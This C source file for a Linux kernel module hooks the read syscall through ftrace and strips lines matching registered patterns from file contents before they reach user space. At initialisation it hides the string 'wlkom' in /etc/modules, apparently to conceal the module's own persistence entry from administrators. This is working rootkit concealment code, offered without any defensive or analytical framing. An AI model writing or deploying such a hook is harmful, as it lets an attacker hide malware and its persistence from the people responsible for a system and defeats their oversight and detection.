#include "syscall_hook.h"

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>


typedef asmlinkage long (*orig_read_t)(const struct pt_regs *regs);
static orig_read_t orig_read = NULL;
struct line_hidded *hide_list = NULL;




asmlinkage long hook_read(const struct pt_regs *regs)
{
    // Ici ret == len(buffer)
    long ret = orig_read(regs);
    if (ret > 0) 
    {
        //element pour recup le buffer
        char __user *buf = (char __user *)regs->si; // buf from user space (only use to transfer data into kernelspace)
        char *kbuf;

        // element pour recup le chemin du fichier et s'assurer quon filtre bien la ligne du bon fichier
        struct fd f;
        char *path_buf;
        char *path;


        // recuperation du buffer et verif d'usage (si c'est bien un fichire, si le buffer est valide)
        f = fdget(regs->di);
        if (!f.file)
        {
            return ret;
        }

        path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
        if (!path_buf) 
        {
            fdput(f);
            return ret;
        }

        path = d_path(&f.file->f_path, path_buf, PATH_MAX);
        fdput(f); // libère f on en a plus besoin


        struct line_hidded *head = hide_list;

        // commence a s occuper du buffer dans le fichier
        kbuf = kmalloc(ret + 1, GFP_KERNEL);
        if (!kbuf)
        {
            return ret;
        }

        if (copy_from_user(kbuf, buf, ret)) 
        {
            kfree(kbuf);
            return ret;
        }
        kbuf[ret] = '\0';


        while(head)
        {
           if(strstr(path, head->path) && strnstr(kbuf, head->str_pattern, ret))
           {
                char *newBuf = kmalloc(ret + 1, GFP_KERNEL); // va contenir le buffer transformé
                int newBufLen = 0;

                // vont servir pour "découper" le buffer
                char *start = kbuf;
                char *end;

                
                while (start < kbuf + ret)
                {
                    end = strchr(start, '\n');
                    if (!end)
                    {
                        int tmpLen = kbuf + ret - start;
                        if (!strnstr(start, head->str_pattern, tmpLen)) 
                        {
                            memcpy(newBuf + newBufLen, start, tmpLen);
                            newBufLen += tmpLen;
                        }
                        break;
                    }
                    end++;
                    int tmpLen = end - start;
                    if (!strnstr(start, head->str_pattern, tmpLen)) 
                    {
                        memcpy(newBuf + newBufLen, start, tmpLen);
                        newBufLen += tmpLen;
                    } else 
                    {
                        pr_info("hook: pattern detected, line hidden\n");
                    }
                    start = end;
                }
                
                copy_to_user(buf, newBuf, newBufLen);
                ret = newBufLen;
                kfree(newBuf);
                
           }
           head = head->next;
        }

        kfree(kbuf);
        kfree(path_buf);
        
        
        
    }
    return ret;
}


void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->ip = (unsigned long)hook->function;
    }
}

struct ftrace_hook read_hook = 
{
    .function = hook_read,
    .original = &orig_read,
};

int wlkom_syscall_hook_init(void)
{

    wlkom_hide_add("wlkom", "/etc/modules");


    int ret = kallsyms_lookup_name("__x64_sys_read");
    if (!ret) 
    {
        pr_err("walkom_log: could not find sys_read\n");
        return -ENOENT;
    }

    read_hook.address = ret;
    *((unsigned long *)read_hook.original) = read_hook.address;

    read_hook.ops.func = ftrace_callback;
    read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
    if (ret)
    {
        pr_err("walkom_log: ftrace_set_filter_ip failed: %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&read_hook.ops);
    if (ret)
    {
        pr_err("walkom_log: register_ftrace_function failed: %d\n", ret);
        return ret;
    }

    pr_info("walkom_log: syscall hook initialized\n");
    return 0;
}

void wlkom_syscall_hook_exit(void)
{
    unregister_ftrace_function(&read_hook.ops);
    ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
    wlkom_hide_free();
    pr_info("walkom_log: syscall hook removed\n");
}




int wlkom_hide_add(const char *pattern, const char *path)
{
    struct line_hidded *node = kmalloc(sizeof(struct line_hidded), GFP_KERNEL);
    if (!node)
    {
        return 0;
    }

    node->str_pattern = kstrdup(pattern, GFP_KERNEL);
    node->path = kstrdup(path, GFP_KERNEL);

    if (!node->str_pattern || !node->path) 
    {
        kfree(node->str_pattern);
        kfree(node->path);
        kfree(node);
        return 0;
    }
    node->next = hide_list;
    hide_list = node;

    return 1;
}

void wlkom_hide_free(void)
{
    struct line_hidded *cur = hide_list;
    struct line_hidded *next;

    while (cur) 
    {
        next = cur->next;
        kfree(cur->str_pattern);
        kfree(cur->path);
        kfree(cur);
        cur = next;
    }
    hide_list = NULL;
}
